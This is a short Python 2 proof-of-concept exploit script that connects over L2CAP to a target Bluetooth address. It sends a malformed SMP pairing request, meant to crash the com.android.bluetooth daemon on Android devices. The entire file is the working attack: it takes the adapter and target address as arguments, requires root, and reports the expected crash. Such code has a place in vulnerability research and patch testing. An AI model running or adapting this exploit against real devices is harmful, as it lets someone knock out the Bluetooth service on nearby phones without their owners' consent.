#!/usr/bin/env python2

import os
import sys
from l2cap_infra import *

L2CAP_SMP_CID = 0x06
# This matches the CID used in l2cap_infra to establish a successful connection.
OUR_LOCAL_SCID = 0x40
SMP_OPCODE_PAIRING_REQ = 0x01
def main(src_hci, dst_bdaddr):
    l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
    print "Sending SMP_OPCODE_PAIRING_REQ in L2CAP connection..."
    cmd_code = SMP_OPCODE_PAIRING_REQ
    the_id = 0x41       # not important
    cmd_len = 0x08
    flags = 0x4142      # not important
    # here we use L2CAP_SMP_CID as cid
    l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SMP_CID) / Raw(struct.pack('<BBHHH', cmd_code, the_id, cmd_len, OUR_LOCAL_SCID, flags)))
    l2cap_loop.finish()
    print "The com.android.bluetooth daemon should have crashed."
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: smp01.py <src-hci> <dst-bdaddr>")
    else:
        if os.getuid():
            print "Error: This script must be run as root."
        else:
            main(*sys.argv[1:])
